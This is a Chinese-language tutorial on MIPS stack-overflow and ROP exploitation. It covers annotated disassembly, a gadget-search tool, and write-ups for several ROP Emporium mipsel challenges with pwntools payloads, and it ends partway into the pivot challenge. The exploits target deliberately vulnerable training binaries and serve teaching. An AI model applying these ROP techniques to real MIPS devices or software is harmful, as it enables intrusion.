.text:00400690                 sw      $fp, 0x20+var_s0($sp)  # Store Word
.text:00400694                 move    $fp, $sp         # Move register
.text:00400698                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)  # Load Immediate
.text:004006A0                 sw      $gp, 0x20+var_10($sp)  # 保存gp
.text:004006A0                                          # 下面是代码
.text:004006A4                 li      $v0, 0x100       # v0 = 0x100
.text:004006A8                 sw      $v0, 0x20+var_8($fp)  # 保存到局部变量里
.text:004006AC                 li      $v0, 0x10        # v0 = 0x10
.text:004006B0                 sw      $v0, 0x20+var_4($fp)  # 保存在局部变量
.text:004006B4                 lw      $a1, 0x20+var_4($fp)  # 取出来0x10到a1
.text:004006B8                 lw      $a0, 0x20+var_8($fp)  # 取出来0x100到a0
.text:004006BC                 jal     av               # 跳转到函数中去，此时会设置ra
.text:004006BC                                          # 这里的参数是av(0x100,0x10)，从左往右依次进入a0，a1...
.text:004006C0                 nop                      # 函数调用完会出现一个nop
.text:004006C4                 lw      $gp, 0x20+var_10($fp)  # 取回gp
.text:004006C8                 move    $a1, $v0         # 返回值v0给a1
.text:004006CC                 lui     $v0, 0x40  # '@'  # 寻址字符串给a0
.text:004006D0                 addiu   $a0, $v0, (aX - 0x400000)  # format
.text:004006D4                 la      $v0, printf      # 寻址printf
.text:004006D8                 move    $t9, $v0         # Move register
.text:004006DC                 jalr    $t9  # printf    # 再次调用函数
.text:004006E0                 nop                      # No operation
.text:004006E4                 lw      $gp, 0x20+var_10($fp)  # 取回gp
.text:004006E8                 move    $v0, $zero       # 返回值是0
.text:004006E8                                          # 下面是还原栈帧了
.text:004006EC                 move    $sp, $fp         # Move register
.text:004006F0                 lw      $ra, 0x20+var_s4($sp)  # Load Word
.text:004006F4                 lw      $fp, 0x20+var_s0($sp)  # Load Word
.text:004006F8                 addiu   $sp, 0x28        # Add Immediate Unsigned
.text:004006FC                 jr      $ra              # Jump Register
.text:00400700                 nop     
```

```
.text:00400650
.text:00400650  # int __fastcall av(int, int)
.text:00400650                 .globl av
.text:00400650 av:                                      # CODE XREF: main+34↓p
.text:00400650
.text:00400650 var_s0          =  0
.text:00400650 arg_0           =  4
.text:00400650 arg_4           =  8
.text:00400650
.text:00400650                 addiu   $sp, -8          # Add Immediate Unsigned
.text:00400654                 sw      $fp, 4+var_s0($sp)  # Store Word
.text:00400658                 move    $fp, $sp         #
.text:00400658                                          # 上面是栈初始化
.text:0040065C                 sw      $a0, 4+arg_0($fp)  # 参数1保存到栈上
.text:00400660                 sw      $a1, 4+arg_4($fp)  # 参数2保存到栈上
.text:00400664                 lw      $v1, 4+arg_0($fp)  # 取出参数1到v1
.text:00400668                 lw      $v0, 4+arg_4($fp)  # 取出参数2到v0
.text:0040066C                 addu    $v0, $v1, $v0    # 相加，结果保存在v0
.text:00400670                 sra     $v0, 1           # 右移，v0用作返回值
.text:00400670                                          # 下面是栈帧还原
.text:00400674                 move    $sp, $fp         # Move register
.text:00400678                 lw      $fp, 4+var_s0($sp)  # Load Word
.text:0040067C                 addiu   $sp, 8           # Add Immediate Unsigned
.text:00400680                 jr      $ra              # 返回到main
.text:00400684                 nop                      # No operation
.text:00400684  # End of function av
```

## MIPS ROP 基础

**不同架构下影响ROP的构造的主要因素来自于栈帧的序言和尾声**，这里默认读者掌握x86架构程序的rop链构造，这里介绍 MIPS 下特有的一些信息

**mips程序的特点：**

* mips没有aslr和pie机制，pie地址可知
* 部分mips程序没有nx机制，栈可执行

**在rop寻找gadget环节中：**

* 一般t9和ra常用于操控rop的返回地址

* t9常用于函数调用，ra常用于函数返回

* 一般s0-s7常用于操控函数传参寄存器a0-a3

* 寻找类似 `move $a0,$s0` 的指令

### 关于覆盖返回地址

在进入函数的时候，在栈帧初始化的时候保存到栈里：

```
.text:004008F4                 addiu   $sp, -0x40
.text:004008F8                 sw      $ra, 0x38+var_s4($sp)
.text:004008FC                 sw      $fp, 0x38+var_s0($sp)
.text:00400900                 move    $fp, $sp
```

在退出函数的时候，从栈上取回返回地址，进行跳转：

```
.text:004009E8                 move    $sp, $fp
.text:004009EC                 lw      $ra, 0x38+var_s4($sp)
.text:004009F0                 lw      $fp, 0x38+var_s0($sp)
.text:004009F4                 addiu   $sp, 0x40
.text:004009F8                 jr      $ra
```

当发生栈溢出的时候，会覆盖到栈上的返回地址数据

和x86架构的区别在于，返回地址是由栈帧操作放入取出栈空间，x86则是call和ret指令包含了这个过程

### gadget 查询工具 mipsrop

主要用 IDA 插件 mipsrop 来查询，这个比较好使，下载地址：<https://github.com/fuzzywalls/ida/tree/master/plugins/mipsrop>

搜索示例：

* 搜索寄存器控制 gadgets

```
# 查找控制 $s0-$s7 寄存器的 gadgets
mipsrop.find("move $v0")
mipsrop.find("lw $ra")
```

* 搜索跳转 gadgets

```
# 查找 jr $t9 类型的 gadgets
mipsrop.find("jr $t9")
mipsrop.find("jalr $t9")
```

## MIPS ROP Emporium 练习

**具体构造rop链还是得跟着练习走去感受比较合适，这里是ROP Emporium中mips版本的一系列题目，对于太基础的部分，就以wp为主，对于复杂需要讲解的部分，会有分析过程**

### 0x01 ret2win\_mipsel

#### 题目分析&利用分析

main：

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  puts("ret2win by ROP Emporium");
  puts("MIPS
");
  pwnme();
  puts("
Exiting");
  return 0;
}

int pwnme()
{
  _BYTE s[32]; // [sp+18h] [+18h] BYREF

  memset(s, 0, sizeof(s));
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!
");
  printf("> ");
  read(0, s, 0x38u);
  return puts("Thank you!");
}
```

ret2win函数提供flag：

```
int ret2win()
{
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}
```

找到溢出点到返回地址的距离：32+4=0x24，直接覆盖返回地址为ret2win即可

#### 溢出点到返回地址的距离：如何静态计算

溢出函数的汇编部分开头：

```
.text:004008F4  # int pwnme()
.text:004008F4 pwnme:                                   # CODE XREF: main+80↑p
.text:004008F4
.text:004008F4 var_28          = -0x28
.text:004008F4 var_20          = -0x20
.text:004008F4 var_s0          =  0
.text:004008F4 var_s4          =  4

.text:004008F4
.text:004008F4                 addiu   $sp, -0x40
.text:004008F8                 sw      $ra, 0x38+var_s4($sp)
.text:004008FC                 sw      $fp, 0x38+var_s0($sp)
.text:00400900                 move    $fp, $sp
```

这里的var\_20是缓冲区，这里的偏移是fp的偏移，而f5反编译里写的是sp偏移

在函数体中，返回地址是相对于fp的，这里开头开辟栈帧保存返回地址和原fp指针，分别放入了`s0`和`s4`，也就是`fp+0`和`fp+4`的地方

​`fp+4`处保存的就是返回地址

所以只需要知道缓冲区距离fp指针的距离，在这个基础上+4就是返回地址所在

这里就是0x20+4=0x24字节

#### exp 核心代码

```
win = 0x0400A00
payload = cyclic(36) + p32(win)

sla(b"> ",payload)
```

### 0x02 split\_mipsel

#### 题目分析&利用分析

main函数：

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  puts("split by ROP Emporium");
  puts("MIPS
");
  pwnme();
  puts("
Exiting");
  return 0;
}

int pwnme()
{
  _BYTE s[32]; // [sp+18h] [+18h] BYREF

  memset(s, 0, sizeof(s));
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0, s, 0x60u);
  return puts("Thank you!");
}
```

依然是0x24数据填充后是返回地址

这次没有ret2win函数，题目给了一些片段：

```
.text:004009C8  # int usefulFunction()
.text:004009C8 usefulFunction:
.text:004009C8
.text:004009C8 var_8           = -8
.text:004009C8 var_s0          =  0
.text:004009C8 var_s4          =  4
.text:004009C8
.text:004009C8                 addiu   $sp, -0x20
.text:004009CC                 sw      $ra, 0x18+var_s4($sp)
.text:004009D0                 sw      $fp, 0x18+var_s0($sp)
.text:004009D4                 move    $fp, $sp
.text:004009D8                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)
.text:004009E0                 sw      $gp, 0x18+var_8($sp)
.text:004009E4                 lui     $v0, 0x40  # '@'
.text:004009E8                 addiu   $a0, $v0, (aBinLs - 0x400000)  # "/bin/ls"
.text:004009EC                 la      $v0, system
.text:004009F0                 move    $t9, $v0
.text:004009F4                 jalr    $t9  # system
.text:004009F8                 nop
.text:004009FC                 lw      $gp, 0x18+var_8($fp)
.text:00400A00                 nop
.text:00400A04                 move    $sp, $fp
.text:00400A08                 lw      $ra, 0x18+var_s4($sp)
.text:00400A0C                 lw      $fp, 0x18+var_s0($sp)
.text:00400A10                 addiu   $sp, 0x20
.text:00400A14                 jr      $ra
.text:00400A18                 nop
.text:00400A18  # End of function usefulFunction
.text:00400A18
```

system函数的调用片段

```
.text:00400A18  # ---------------------------------------------------------------------------
.text:00400A1C                 .align 4
.text:00400A20
.text:00400A20 usefulGadgets:
.text:00400A20                 lw      $a0, 8($sp)
.text:00400A24                 lw      $t9, 4($sp)
.text:00400A28                 jalr    $t9
.text:00400A2C                 nop
```

和gadget

> mips的gadget都是通过ra或者t9进行跳转的

```
.data:00411010                 .globl usefulString
.data:00411010 usefulString:   .ascii "/bin/cat flag.txt"<0>
```

还有读取flag的字符串

接下来通过栈溢出控制返回地址到00400A20，然后通过栈读取参数，控制a0的值和t9的值，去执行system函数

#### exp 核心代码

```
a0_t9 = 0x0400A20
str_catflag = 0x0411010

payload = cyclic(0x24)+p32(a0_t9)+p32(0xdeadbeef) +p32(elf.sym.system) +p32(str_catflag)
sla(b"> ", payload)
```

ROPE{a\_placeholder\_32byte\_flag!}

### 0x03 callme\_mipsel

#### 题目分析&利用分析

main：和之前一样：

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  puts("callme by ROP Emporium");
  puts("MIPS
");
  pwnme();
  puts("
Exiting");
  return 0;
}

int pwnme()
{
  _BYTE s[32]; // [sp+18h] [+18h] BYREF

  memset(s, 0, sizeof(s));
  puts("Hope you read the instructions...
");
  printf("> ");
  read(0, s, 0x200u);
  return puts("Thank you!");
}
```

依然是0x24填充数据来操作返回地址

这次给了：

```
void __noreturn usefulFunction()
{
  callme_three(4, 5, 6);
  callme_two(4, 5, 6);
  callme_one(4, 5, 6);
  exit(1);
}
```

3个函数的调用，都来自so文件

gadget：

```
.text:00400BB0 usefulGadgets:
.text:00400BB0                 lw      $a0, 0x10($sp)
.text:00400BB4                 lw      $a1, 0xC($sp)
.text:00400BB8                 lw      $a2, 8($sp)
.text:00400BBC                 lw      $t9, 4($sp)
.text:00400BC0                 jalr    $t9
.text:00400BC4                 nop
.text:00400BC8                 lw      $ra, 0x14($sp)
.text:00400BCC                 jr      $ra
.text:00400BD0                 addi    $sp, 0x18
```

可以通过栈来完成a0-a2和t9的赋值

jalr指令以寄存器为操作数，跳转到寄存器指向的地址，同时设置ra为下一条指令，t9执行完之后取0x14偏移sp进行跳转

具体这三个callme函数：

```
int __fastcall callme_one(int a1, int a2, int a3)
{
  FILE *stream; // [sp+1Ch] [+1Ch]

  if ( a1 != 0xDEADBEEF || a2 != -889275714 || a3 != -804392947 )
  {
    puts("Incorrect parameters");
    exit(1);
  }
  stream = fopen("encrypted_flag.dat", "r");
  if ( !stream )
  {
    puts("Failed to open encrypted_flag.dat");
    exit(1);
  }
  g_buf = (char *)malloc(0x21u);
  if ( !g_buf )
  {
    puts("Could not allocate memory");
    exit(1);
  }
  g_buf = fgets(g_buf, 33, stream);
  fclose(stream);
  return puts("callme_one() called correctly");
}

int __fastcall callme_two(int a1, int a2, int a3)
{
  int i; // [sp+18h] [+18h]
  FILE *stream; // [sp+1Ch] [+1Ch]

  if ( a1 != 0xDEADBEEF || a2 != 0xCAFEBABE || a3 != 0xD00DF00D )
  {
    puts("Incorrect parameters");
    exit(1);
  }
  stream = fopen("key1.dat", "r");
  if ( !stream )
  {
    puts("Failed to open key1.dat");
    exit(1);
  }
  for ( i = 0; i < 16; ++i )
    g_buf[i] ^= fgetc(stream);
  return puts("callme_two() called correctly");
}

void __fastcall __noreturn callme_three(int a1, int a2, int a3)
{
  int i; // [sp+18h] [+18h]
  FILE *stream; // [sp+1Ch] [+1Ch]

  if ( a1 == 0xDEADBEEF && a2 == 0xCAFEBABE && a3 == 0xD00DF00D )
  {
    stream = fopen("key2.dat", "r");
    if ( !stream )
    {
      puts("Failed to open key2.dat");
      exit(1);
    }
    for ( i = 16; i < 32; ++i )
      g_buf[i] ^= fgetc(stream);
    *((_DWORD *)g_buf + 1) ^= 0xDEADBEEF;
    *((_DWORD *)g_buf + 2) ^= 0xDEADBEEF;
    *((_DWORD *)g_buf + 3) ^= 0xCAFEBABE;
    *((_DWORD *)g_buf + 4) ^= 0xCAFEBABE;
    *((_DWORD *)g_buf + 5) ^= 0xD00DF00D;
    *((_DWORD *)g_buf + 6) ^= 0xD00DF00D;
    puts(g_buf);
    exit(0);
  }
  puts("Incorrect parameters");
  exit(1);
}
```

需要按顺序调用callme123才能正确给出flag，这三个call都需要满足参数要求

需要通过gadget完成布置参数按照顺序调用即可

#### exp 核心代码

```
callme1 = 0x0400D20
callme2 = 0x0400D80
callme3 = 0x0400D10

payload = cyclic(0x24) 

"""
.text:00400BB0 usefulGadgets:
.text:00400BB0                 lw      $a0, 0x10($sp)
.text:00400BB4                 lw      $a1, 0xC($sp)
.text:00400BB8                 lw      $a2, 8($sp)
.text:00400BBC                 lw      $t9, 4($sp)
.text:00400BC0                 jalr    $t9
.text:00400BC4                 nop
.text:00400BC8                 lw      $ra, 0x14($sp)
.text:00400BCC                 jr      $ra
.text:00400BD0                 addi    $sp, 0x18
"""

useful = 0x00400BB0
# callme1
#  if ( a1 != 0xDEADBEEF || a2 != 0xCAFEBABE || a3 != 0xD00DF00D )
rop = ROP(elf)
rop.raw(useful)
rop.raw(0xdead)
rop.raw(callme1)
rop.raw(0xd00df00d)
rop.raw(0xcafebabe)
rop.raw(0xdeadbeef)
rop.raw(useful)
# callme2
#  if ( a1 != 0xDEADBEEF || a2 != 0xCAFEBABE || a3 != 0xD00DF00D )
rop.raw(0xdead)
rop.raw(callme2)
rop.raw(0xd00df00d)
rop.raw(0xcafebabe)
rop.raw(0xdeadbeef)
rop.raw(useful)
# callme3
#   if ( a1 == 0xDEADBEEF && a2 == 0xCAFEBABE && a3 == 0xD00DF00D )
rop.raw(0xdead)
rop.raw(callme3)
rop.raw(0xd00df00d)
rop.raw(0xcafebabe)
rop.raw(0xdeadbeef)
rop.raw(useful)
payload += rop.chain()
print(rop.dump())

sla(b"> ", payload)
```

ROPE{a\_placeholder\_32byte\_flag!}

### 0x04 write4\_mipsel

#### 题目分析&利用分析

主文件：

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  pwnme(argc, argv, envp);
  return 0;
}

int usefulFunction()
{
  return print_file("nonexistent");
}
```

意思是调用print\_file函数用flag.txt的参数

查看so文件：

```
int pwnme()
{
  _BYTE s[32]; // [sp+18h] [+18h] BYREF

  setvbuf(stdout, 0, 2, 0);
  puts("write4 by ROP Emporium");
  puts("MIPS
");
  memset(s, 0, sizeof(s));
  puts("Go ahead and give me the input already!
");
  printf("> ");
  read(0, s, 0x200u);
  return puts("Thank you!");
}

int __fastcall print_file(const char *filename)
{
  FILE *stream; // [sp+18h] [+18h]
  char s[36]; // [sp+1Ch] [+1Ch] BYREF

  stream = fopen(filename, "r");
  if ( !stream )
  {
    printf("Failed to open file: %s
", filename);
    exit(1);
  }
  fgets(s, 33, stream);
  puts(s);
  return fclose(stream);
}
```

依然是0x24字节填充，print\_file可以用来打印flag

gadget：

```
.text:00400930
.text:00400930 usefulGadgets:
.text:00400930                 lw      $t9, 0xC($sp)
.text:00400934                 lw      $t0, 8($sp)
.text:00400938                 lw      $t1, 4($sp)
.text:0040093C                 sw      $t1, 0($t0)
.text:00400940                 jalr    $t9
.text:00400944                 addi    $sp, 0x10

.text:00400948                 lw      $a0, 8($sp)
.text:0040094C                 lw      $t9, 4($sp)
.text:00400950                 jalr    $t9
.text:00400954                 nop
.text:00400958                 nop
.text:0040095C                 nop
```

给了2段gadget：

1. 设置t0和t1的值，将t1的值保存到t0指向地址里
2. 设置a0

那么思路很简单：

1. 通过gadget1设置flag.txt到内存可写地方
2. 然后通过gadget2完成print\_file的调用

#### exp 核心代码

```
"""
.text:00400930 usefulGadgets:
.text:00400930                 lw      $t9, 0xC($sp)    
.text:00400934                 lw      $t0, 8($sp)      
.text:00400938                 lw      $t1, 4($sp)
.text:0040093C                 sw      $t1, 0($t0)  t1的值保存在t0里 把flag字符串保存在栈里, 还差.txt 需要多次做这个事情
.text:00400940                 jalr    $t9
.text:00400944                 addi    $sp, 0x10
.text:00400948                 lw      $a0, 8($sp)
.text:0040094C                 lw      $t9, 4($sp)
.text:00400950                 jalr    $t9
.text:00400954                 nop
.text:00400958                 nop
.text:0040095C                 nop
"""

gadget2 = 0x0400930
gadget22 = 0x0400944
print_file = 0x0400A90
buf = 0x411000
rop = ROP(elf)
# 溢出覆盖 ra
rop.raw(gadget2)    
# gadget2
rop.raw(0xded)
rop.raw(b"flag")    # t1
rop.raw(buf)        # t0
rop.raw(gadget2)   # t9

rop.raw(0xded)
rop.raw(b".txt")    # t1
rop.raw(buf+4)        # t0
rop.raw(gadget22)   # t9

rop.raw(0xaa)
rop.raw(0xaa)
rop.raw(0xaa)
rop.raw(0xaa)

rop.raw(0xded)
rop.raw(print_file)      # t9
rop.raw(buf)           # a0


payload = cyclic(0x24) + rop.chain()
sla(b"> ", payload)
```

ROPE{a\_placeholder\_32byte\_flag!}

### 0x05 badchars\_mipsel

#### 题目分析&利用分析

pwnme放在so里了这次

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  pwnme(argc, argv, envp);
  return 0;
}

int usefulFunction()
{
  return print_file("nonexistent");
}

```

主文件中给了辅助函数和gadget：

```
.text:00400930
.text:00400930 usefulGadgets:
.text:00400930                 lw      $t9, 0xC($sp)
.text:00400934                 lw      $t0, 8($sp)
.text:00400938                 lw      $t1, 4($sp)
.text:0040093C                 sw      $t1, 0($t0)
.text:00400940                 jalr    $t9
.text:00400944                 addi    $sp, 0x10

.text:00400948                 lw      $t9, 0xC($sp)
.text:0040094C                 lw      $t0, 8($sp)
.text:00400950                 lw      $t1, 4($sp)
.text:00400954                 lw      $t2, 0($t1)
.text:00400958                 xor     $t0, $t2
.text:0040095C                 sw      $t0, 0($t1)
.text:00400960                 jalr    $t9
.text:00400964                 addi    $sp, 0x10

.text:00400968                 lw      $a0, 8($sp)
.text:0040096C                 lw      $t9, 4($sp)
.text:00400970                 jalr    $t9
.text:00400974                 addi    $sp, 0xC
.text:00400978                 nop
.text:0040097C                 nop
```

so的print\_file可用，gadget给了3段：

1. 赋值t0，t1，将t1保存到t0中（意味着t1是值，t0是地址
2. 赋值t0，t1，从t1读取4字节到t2，异或t2和t0，结果保存会t1里（对t1地址的值进行异或操作
3. 赋值a0跳转执行函数

so中：

```
int pwnme()
{
  unsigned int i_1; // [sp+18h] [+18h]
  unsigned int i; // [sp+1Ch] [+1Ch]
  unsigned int j; // [sp+20h] [+20h]
  _BYTE s[32]; // [sp+28h] [+28h] BYREF

  setvbuf(stdout, 0, 2, 0);
  puts((const char *)&s_);
  puts("MIPS
");
  memset(s, 0, sizeof(s));
  puts("badchars are: 'x', 'g', 'a', '.'");
  printf("> ");
  i_1 = read(0, s, 0x200u);
  for ( i = 0; i < i_1; ++i )
  {
    for ( j = 0; j < 4; ++j )
    {
      if ( (char)s[i] == badcharacters[j] )
        s[i] = 0xEB;
    }
  }
  return puts("Thank you!");
}

int __fastcall print_file(const char *filename)
{
  FILE *stream; // [sp+18h] [+18h]
  char s[36]; // [sp+1Ch] [+1Ch] BYREF

  stream = fopen(filename, "r");
  if ( !stream )
  {
    printf("Failed to open file: %s
", filename);
    exit(1);
  }
  fgets(s, 33, stream);
  puts(s);
  return fclose(stream);
}
```

输入里如果由xga.四个字符，就会被替换成0xeb，print\_file函数可用于打印flag

思路：

1. 找个可写地址用来保存字符串
2. 通过gadget1写入flag.txt，分两次写
3. 对可写地址的值进行异或操作，让0xeb变回原本的值，分两次操作
4. 跳转到print\_file调用

#### exp 核心代码

```
"""
.text:00400930  # ---------------------------------------------------------------------------
.text:00400930
.text:00400930 usefulGadgets:
.text:00400930                 lw      $t9, 0xC($sp)
.text:00400934                 lw      $t0, 8($sp)
.text:00400938                 lw      $t1, 4($sp)
.text:0040093C                 sw      $t1, 0($t0)
.text:00400940                 jalr    $t9
.text:00400944                 addi    $sp, 0x10

.text:00400948                 lw      $t9, 0xC($sp)
.text:0040094C                 lw      $t0, 8($sp)
.text:00400950                 lw      $t1, 4($sp)
.text:00400954                 lw      $t2, 0($t1)
.text:00400958                 xor     $t0, $t2
.text:0040095C                 sw      $t0, 0($t1)
.text:00400960                 jalr    $t9
.text:00400964                 addi    $sp, 0x10

.text:00400968                 lw      $a0, 8($sp)
.text:0040096C                 lw      $t9, 4($sp)
.text:00400970                 jalr    $t9
.text:00400974                 addi    $sp, 0xC

.text:00400978                 nop
.text:0040097C                 nop
"""

"""
.rodata:00000CB0 badcharacters:  .byte 0x78  # x             # DATA XREF: LOAD:00000478↑o
.rodata:00000CB0                                          # pwnme+134↑o ...
.rodata:00000CB1                 .byte 0x67  # g
.rodata:00000CB2                 .byte 0x61  # a
.rodata:00000CB3                 .byte 0x2E  # .
"""

buf = 0x411000

gadget1 = 0x0400930
gadget2 = 0x0400948
gadget3 = 0x0400968 
print_file = 0x0400AB0
rop = ROP(elf)
rop.raw(gadget1)

rop.raw(0xaa)
rop.raw(b"flag")   # t1
rop.raw(buf)   # t0
rop.raw(gadget1)   # t9

rop.raw(0xaa)
rop.raw(b".txt")   # t1
rop.raw(buf+4)   # t0
rop.raw(gadget2)   # t9

rop.raw(0xcc)
rop.raw(buf)    # t1
rop.raw(b"\x00\x00" + bytes([ord('a')^0xeb,ord('g')^0xeb]))       # t0
rop.raw(gadget2)    # t9

rop.raw(0xdd)
rop.raw(buf+4)    # t1
rop.raw(bytes([ord('.')^0xeb,0,ord('x')^0xeb,0]))       # t0
rop.raw(gadget3)    # t9

rop.raw(0xee)
rop.raw(print_file)    # t9
rop.raw(buf)        # a0


payload = 0x24*b"\x11" + rop.chain()
sla(b"> ", payload)
```

ROPE{a\_placeholder\_32byte\_flag!}

### 0x06 fluff\_mipsel

#### 题目分析&利用分析

主文件：

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  pwnme(argc, argv, envp);
  return 0;
}

int usefulFunction()
{
  return print_file("nonexistent");
}
```

so文件：

```
int pwnme()
{
  _BYTE s[32]; // [sp+18h] [+18h] BYREF

  setvbuf(stdout, 0, 2, 0);
  puts("fluff by ROP Emporium");
  puts("MIPS
");
  memset(s, 0, sizeof(s));
  puts("You know changing these strings means I have to rewrite my solutions...");
  printf("> ");
  read(0, s, 0x200u);
  return puts("Thank you!");
}
```

依然是0x24的填充长度，依然是调用print\_file函数，和上一个题目的区别在于，gadget变了

gadget：

```
.text:00400930
.text:00400930 questionableGadgets:
.text:00400930                 lw      $t9, 8($sp)
.text:00400934                 lw      $t4, 4($sp)
.text:00400938                 xor     $s1, $s1
.text:0040093C                 li      $a0, 0x412C70
.text:00400944                 jalr    $t9
.text:00400948                 addi    $sp, 0xC

.text:0040094C                 lw      $t9, 8($sp)
.text:00400950                 lw      $s2, 4($sp)
.text:00400954                 li      $t4, 0x412C74
.text:0040095C                 jalr    $t9
.text:00400960                 addi    $sp, 0xC

.text:00400964                 lw      $t9, 4($sp)
.text:00400968                 xor     $s1, $s2
.text:0040096C                 li      $a1, 0x411500
.text:00400974                 jalr    $t9
.text:00400978                 addi    $sp, 8

.text:0040097C                 lw      $t9, 4($sp)
.text:00400980                 xor     $s0, $s1
.text:00400984                 xor     $s1, $s0, $s1
.text:00400988                 xor     $s0, $s1
.text:0040098C                 li      $t5, 0x411504
.text:00400994                 jalr    $t9
.text:00400998                 addi    $sp, 8

.text:0040099C                 lw      $t9, 4($sp)
.text:004009A0                 sw      $s1, 0($s0)
.text:004009A4                 jalr    $t9
.text:004009A8                 addi    $sp, 8

.text:004009AC                 lw      $a0, 8($sp)
.text:004009B0                 lw      $t9, 4($sp)
.text:004009B4                 jalr    $t9
.text:004009B8                 addi    $sp, 0xC
.text:004009BC                 nop
.text:004009C0
```

这里给了6段gadget，分开来看功能：

1. 设置 s0 = 0
2. 设置 s2 指定值
3. 异或操作 s1 = s1^s2
4. s0 和 s1交换数据
5. 保存 s1 的值到 s0 的地址里
6. 设置 a0 的值

目标依然是向一个可写地址写入flag.txt，思路则是：

1. 将字符串的值写入s1寄存器，可写地址的值保存到s0中

1. 结合gadget1和4，可以给s1清空，结合gadget2和3，可以给s1完成赋值
2. 通过gadget4可以将s1的值换回给s0

2. 将字符串的地址写入a0，跳转print\_file

#### exp 核心代码

```
"""
.text:00400930 questionableGadgets:
; s1清空
.text:00400930                 lw      $t9, 8($sp)
.text:00400934                 lw      $t4, 4($sp)
.text:00400938                 xor     $s1, $s1
.text:0040093C                 li      $a0, 0x412C70
.text:00400944                 jalr    $t9
.text:00400948                 addi    $sp, 0xC

; 设置s2
.text:0040094C                 lw      $t9, 8($sp)
.text:00400950                 lw      $s2, 4($sp)
.text:00400954                 li      $t4, 0x412C74
.text:0040095C                 jalr    $t9
.text:00400960                 addi    $sp, 0xC

; 异或s0和s2的值,保存到s1,给s1赋值
.text:00400964                 lw      $t9, 4($sp)
.text:00400968                 xor     $s1, $s2
.text:0040096C                 li      $a1, 0x411500
.text:00400974                 jalr    $t9
.text:00400978                 addi    $sp, 8

; 交换s0和s1的值,保存到s0里,给t5赋值
.text:0040097C                 lw      $t9, 4($sp)
.text:00400980                 xor     $s0, $s1
.text:00400984                 xor     $s1, $s0, $s1
.text:00400988                 xor     $s0, $s1
.text:0040098C                 li      $t5, 0x411504
.text:00400994                 jalr    $t9
.text:00400998                 addi    $sp, 8

; s1 保存到s0[0]里
.text:0040099C                 lw      $t9, 4($sp)
.text:004009A0                 sw      $s1, 0($s0)
.text:004009A4                 jalr    $t9
.text:004009A8                 addi    $sp, 8

; 调用函数, 设置参数
.text:004009AC                 lw      $a0, 8($sp)
.text:004009B0                 lw      $t9, 4($sp)
.text:004009B4                 jalr    $t9
.text:004009B8                 addi    $sp, 0xC

.text:004009BC                 nop
"""
print_file = 0x0400AF0
buf = 0x411000

gadget1 = 0x0400930
gadget2 = 0x040094C
gadget3 = 0x0400964
gadget4 = 0x040097C
gadget5 = 0x040099C
gadget6 = 0x04009AC


rop = ROP(elf)
rop.raw(gadget1)
# 设置s0=buf,需要先设置s1=buf
# s1 = 0
rop.raw(0x11)
rop.raw(0xaa)
rop.raw(gadget2)
# s2 = buf
rop.raw(0x12)
rop.raw(buf)
rop.raw(gadget3)
# s1 = buf, s2 = buf
rop.raw(0x13)
rop.raw(gadget4)
# s0 = buf, s1 = 0, s2 = buf
rop.raw(0x13)
rop.raw(gadget1)

# 需要设置s1=flag

rop.raw(0x14)
rop.raw(0xaa)
rop.raw(gadget2)

rop.raw(0x15)
rop.raw(b"flag")
rop.raw(gadget3)

rop.raw(0x16)
rop.raw(gadget5)

rop.raw(0x17)
rop.raw(gadget1)

### 再来一遍
# s1 = 0
rop.raw(0x11)
rop.raw(0xaa)
rop.raw(gadget2)
# s2 = buf
rop.raw(0x12)
rop.raw(buf+4)
rop.raw(gadget3)
# s1 = buf, s2 = buf
rop.raw(0x13)
rop.raw(gadget4)
# s0 = buf, s1 = 0, s2 = buf
rop.raw(0x13)
rop.raw(gadget1)

# 需要设置s1=flag

rop.raw(0x14)
rop.raw(0xaa)
rop.raw(gadget2)

rop.raw(0x15)
rop.raw(b".txt")
rop.raw(gadget3)

rop.raw(0x16)
rop.raw(gadget5)

rop.raw(0x17)
rop.raw(gadget6)

rop.raw(0x18)
rop.raw(print_file)
rop.raw(buf)


payload = cyclic(0x24)+rop.chain()
sla(b"> "  , payload)
```

ROPE{a\_placeholder\_32byte\_flag!}

### 0x07 pivot\_mipsel

#### 题目分析&利用分析

主文件：

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *ptr; // [sp+18h] [+18h]

  setvbuf(stdout, 0, 2, 0);
  puts("pivot by ROP Emporium");
  puts("MIPS
");
  ptr = (char *)malloc(0x1000000u);
  if ( !ptr )
  {
    puts("Failed to request space for pivot stack");
    exit(1);
  }
  pwnme(ptr + 0xFFFF00);
  free(ptr);
  puts("
Exiting");
  return 0;
}

int __fastcall pwnme(void *buf)
{
  _BYTE s[32]; // [sp+18h] [+18h] BYREF

  memset(s, 0, sizeof(s));
  puts("Call ret2win() from libpivot");
  printf("The Old Gods kindly bestow upon you a place to pivot: %p
", buf);
  puts("Send a ROP chain now and it will land there");
  printf("> ");
  read(0, buf, 0x100u);
  puts("Thank you!
");
  puts("Now please send your stack smash");
  printf("> ");
  read(0, s, 0x28u);
  return puts("Thank you!");
}
```

提供了漏洞函数，依然是0x24的填充字节，但是这次不一样了

申请了个内存，提供给我们用于栈迁移

第一次读取数据在申请的内存中，是栈迁移之后的栈，第二次读取在栈上，需要进行栈迁移，刚好只能覆盖返回地址，所以需要迁移的gadget

so文件：

```
int foothold_function()
{
  return puts("foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot");
}
void __noreturn ret2win()
{
  FILE *stream; // [sp+1Ch] [+1Ch]
  char s[36]; // [sp+20h] [+20h] BYREF

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Failed to open file: flag.txt");
    exit(1);
  }
  fgets(s, 33, stream);
  puts(s);
  fclose(stream);
  exit(0);
}
```

提供了一个没用的函数，和一个ret2win函数

gadget：

```
